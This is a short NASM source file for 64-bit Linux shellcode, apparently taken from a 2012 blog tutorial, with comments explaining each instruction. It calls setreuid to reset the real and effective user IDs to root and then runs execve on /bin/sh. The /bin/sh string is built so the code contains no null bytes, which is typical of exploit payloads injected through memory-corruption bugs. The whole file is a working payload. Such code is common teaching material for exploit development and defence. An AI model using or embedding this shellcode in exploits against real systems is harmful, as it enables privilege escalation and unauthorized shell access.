BITS 64

;
; 64-bit shellcode
; pushes "/bin/sh",0xff onto the stack and runs execve
;
; http://blog.markloiseau.com/2012/06/64-bit-linux-shellcode/
;

GLOBAL _start

SECTION .data				; needs to be writable and executable for testing
_start:
	; setreuid(ruid, euid)
	xor rax, rax
	add rax, 113			; 113 = setreuid
	xor rdi, rdi			; real userid
	xor rsi, rsi			; effective userid
	syscall
		
run:
	; execve(char *filename, char *argv[], char *envp[]);
	xor rax, rax
	add rax, 59				; 59 = execve
	mov rdi, 0xff68732f6e69622f	; "/bin/sh", 0xff
	shl rdi, 8				; null the last byte (0xff->0x00)
	shr rdi, 8
	push rdi				; push /bin/sh onto the stack
	mov rdi, rsp			; get the address of the string
	xor rsi, rsi			; char *argv[] = null
	xor rdx, rdx			; char *envp[] = null
	syscall

